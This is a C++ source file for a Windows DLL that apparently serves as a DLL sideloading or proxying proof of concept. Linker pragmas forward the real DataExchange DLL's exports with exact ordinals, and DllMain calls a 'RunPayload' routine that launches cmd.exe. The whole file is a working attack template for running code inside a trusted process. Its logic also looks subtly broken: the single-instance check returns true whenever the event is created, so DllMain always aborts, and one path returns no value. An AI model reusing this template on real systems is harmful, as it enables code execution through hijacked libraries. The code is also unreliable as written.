// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <stdio.h>

// Make our DLL export the same funcs, forwarding to the real one.
// Keep ordinals EXACT.
// Syntax: /export:Name=RealDll.Name,@Ordinal

#pragma comment(linker, "/export:DllCanUnloadNow=DataExchange.DllCanUnloadNow,@1")
#pragma comment(linker, "/export:DllGetActivationFactory=DataExchange.DllGetActivationFactory,@2")
#pragma comment(linker, "/export:DllGetClassObject=DataExchange.DllGetClassObject,@3")

HANDLE hEvent = 0;
const char* exe = "C:\\Windows\\System32\\cmd.exe";

BOOL IsOtherInstanceRunning() {
    hEvent = CreateEvent(NULL, TRUE, FALSE, L"event-test-kkkkkkkk");
    
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return TRUE;
    }

    return hEvent != NULL;
}


BOOL RunPayload() {
    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    ZeroMemory(&processInfo, sizeof(processInfo));

    startupInfo.cb = sizeof(startupInfo);

    if (!CreateProcessA(NULL, (LPSTR)exe, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) {
        return false;
    }

    CloseHandle(processInfo.hThread);
    CloseHandle(processInfo.hProcess);

    return true;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if (IsOtherInstanceRunning()) {
        printf("[!] Other instance already running. aborting...");
        return 0;
   }


    RunPayload();
}

